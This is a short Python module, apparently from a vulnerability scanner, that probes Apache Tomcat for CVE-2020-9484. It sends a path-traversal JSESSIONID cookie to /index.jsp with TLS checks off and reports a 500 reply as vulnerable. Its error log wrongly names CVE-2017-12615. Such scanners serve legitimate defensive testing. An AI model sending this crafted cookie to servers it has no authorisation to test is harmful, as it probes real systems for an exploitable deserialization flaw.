import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging
import sys

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
def CVE_2020_9484(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port)

    try:
        u = requests.get(f"{urldata}/index.jsp",verify=False,timeout=3)
        if u.status_code == 200:
            # print("Found Index Page")
            pass
        elif u.status_code == 404:
            print("Looks Like we Could not Find index Page")
            sys.exit()
        header = {
            "Cookie": "JSESSIONID=../../../../../usr/local/tomcat/groovy"
        }
        sett = requests.get(f"{urldata}/index.jsp", headers=header,verify=False,timeout=3)
        if sett.status_code == 200:
            # print(sett.text)
            pass
        if sett.status_code == 500:
            print(Vcolors.RED + "[!] 存在Tomcat CVE_2020_9484漏洞\r" + Vcolors.ENDC)
            sys.exit()
        if sett.text == " ":
            # print("No Content")
            pass
    except:
        logging.error("CVE_2017_12615脚本出现异常")

